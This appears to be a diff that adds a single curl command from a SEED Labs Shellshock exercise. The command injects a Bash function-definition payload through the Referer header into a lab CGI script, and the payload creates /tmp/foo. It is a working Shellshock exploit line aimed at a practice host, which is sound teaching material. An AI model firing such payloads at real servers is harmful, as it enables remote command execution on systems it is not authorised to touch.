@@ -1,0 +1,1 @@
+curl -e "() { :; };echo Content-type: text/plain; echo; /bin/touch /tmp/foo" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
